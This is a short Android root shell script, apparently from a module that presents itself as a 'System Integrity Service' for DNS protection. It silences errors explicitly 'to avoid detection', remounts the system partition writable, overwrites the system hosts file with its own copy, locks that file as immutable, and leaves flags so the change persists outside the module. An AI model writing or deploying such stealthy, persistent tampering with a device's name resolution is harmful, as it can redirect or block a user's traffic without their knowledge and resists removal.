#!/system/bin/sh
# System Integrity Service - Post-FS-Data Script
# Initializes critical DNS protection layer

MODDIR=${0%/*}

# Silent operation - no logging to avoid detection
exec 2>/dev/null

# ============================================
# LAYER 1: HOSTS FILE PROTECTION
# ============================================

if [ -f "$MODDIR/system/etc/hosts" ]; then
    chattr +i "$MODDIR/system/etc/hosts" 2>/dev/null
    chmod 644 "$MODDIR/system/etc/hosts"
    chown root:root "$MODDIR/system/etc/hosts"
fi

# ============================================
# LAYER 5: SYSTEM PERSISTENCE
# Write directly to /system on first run
# ============================================

PERSISTENCE_FLAG="/data/adb/.sis_persisted"

if [ ! -f "$PERSISTENCE_FLAG" ]; then
    mount -o rw,remount /system 2>/dev/null
    
    if [ $? -eq 0 ]; then
        [ -f "/system/etc/hosts" ] && cp /system/etc/hosts /system/etc/hosts.bak 2>/dev/null
        cp "$MODDIR/system/etc/hosts" /system/etc/hosts
        chmod 644 /system/etc/hosts
        chown root:root /system/etc/hosts
        chattr +i /system/etc/hosts 2>/dev/null
        mount -o ro,remount /system 2>/dev/null
        touch "$PERSISTENCE_FLAG"
    fi
fi

# Mark as active
touch /data/adb/.sis_active
